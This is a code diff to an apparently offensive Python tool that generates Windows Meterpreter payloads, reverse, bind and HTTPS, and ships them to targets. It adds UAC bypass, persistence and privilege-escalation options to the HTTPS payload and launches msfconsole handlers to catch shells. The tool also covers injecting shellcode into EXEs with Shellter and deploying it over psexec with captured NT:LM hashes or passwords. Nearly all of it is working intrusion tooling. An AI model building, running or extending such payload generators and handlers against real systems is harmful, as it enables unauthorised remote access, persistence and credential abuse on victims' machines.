@@ -38,7 +38,7 @@ print ('[2] Windows Reverse Meterpreter' + t.bold_green + '(Staged)' + t.bold_re
 print ('[3] Windows Bind Meterpreter' + t.bold_green + '(Staged)' + t.bold_red +
        ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width - 4) + t.normal
 print ('[4] Windows Reverse Meterpreter HTTPS' + t.bold_green + '(Staged)' +
-       t.bold_red + ' [BETA]').center(t.width - 30) + t.normal
+       t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks, Persistence]').center(t.width + 6) + t.normal
 print '=' * t.width
 
 try:
@@ -116,7 +116,7 @@ try:
             sys.exit(1)
         shellcode = payloadchoice % (bindporthex)
 
-    if menuchoice == '2' or menuchoice == '3':
+    if menuchoice == '2' or menuchoice == '3' or menuchoice == '4':
         want_UACBYPASS = raw_input(
             t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
         if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
@@ -128,20 +128,19 @@ try:
 
     if want_PERSISTENCE.lower() == 'y':
         ez2read_shellcode = EXTRAS(shellcode).PERSISTENCE()
-
-    if want_UACBYPASS.lower() == 'y':
+    elif want_UACBYPASS.lower() == 'y':
         ez2read_shellcode = EXTRAS(shellcode).UACBYPASS()
-
-    if want_ALLCHECKS.lower() == 'y':
+    elif want_ALLCHECKS.lower() == 'y':
         ez2read_shellcode = EXTRAS(shellcode).ALLCHECKS()
+    else:
+        ez2read_shellcode = EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE()
 
     want_to_payloadinexe = raw_input(
         t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)
 
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(FUNCTIONS().DoPyCipher(
-                SHELLCODE.injectwindows % (ez2read_shellcode)))
+            Filesave.write(FUNCTIONS().DoPyCipher(SHELLCODE.injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload using Pyinstaller...'
@@ -219,36 +218,13 @@ try:
             a.start()
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        while True:
-            targethash = raw_input(
-                '[*] Targets NT:LM Hash or Plain Text Password:')
-            targetusername = raw_input('[*] Targets Username:')
-            targetdomain = raw_input('[*] Targets Domain:')
-            targetipaddr = raw_input('[*] Targets Ip Address:')
-            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
-            ispsexecdetailscorrect = raw_input(
-                '[*] Are These Details Correct? ([y]/n)')
-            if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
-                if re.search(':', targethash):
-                    print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
-                    targetpassword = ''
-                else:
-                    print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
-                    targetpassword = targethash
-                    targethash = None
-                break
-            else:
-                continue
-        b = multiprocessing.Process(
-            target=FUNCTIONS().ServePsexec, args=(payloaddir + '/' + payloadname, targethash, targetusername, targetdomain, targetipaddr, targetpassword))
-        b.daemon = True
-        b.start()
+        FUNCTIONS().DoPsexec(payloaddir,payloadname)
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % (portnum, int(portnum) + 1))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % portnum)
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
         elif want_PERSISTENCE.lower() == 'y':
@@ -259,7 +235,7 @@ try:
         bindip = raw_input(
             '\n[*] Target Bind IP Address \n[*] IP> ')
         if want_UACBYPASS.lower() == 'y':
-            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip, bindport + 1))
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
         elif want_ALLCHECKS.lower() == 'y':
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % (bindport, bindip))
         elif want_PERSISTENCE.lower() == 'y':
@@ -267,13 +243,20 @@ try:
         else:
             os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j \'' % (bindport, bindip))
     elif menuchoice == '4':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
+        if want_UACBYPASS.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;\'' % portnum)
+        elif want_ALLCHECKS.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+        elif want_PERSISTENCE.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
+        else:
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_https;set LPORT %s;set LHOST 0.0.0.0;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' % portnum)
 
-    print t.bold_green + '[*] Cleaning Up\n' + t.normal
+    raise KeyboardInterrupt
+except KeyboardInterrupt:
+    print t.bold_green + '\n[*] Cleaning Up\n' + t.normal
     subprocess.call(['rm *.rc'], shell=True,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     subprocess.call(['rm *.ps1'], shell=True,
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    sys.exit(0)
-except KeyboardInterrupt:
-    sys.exit(1)
+    sys.exit()
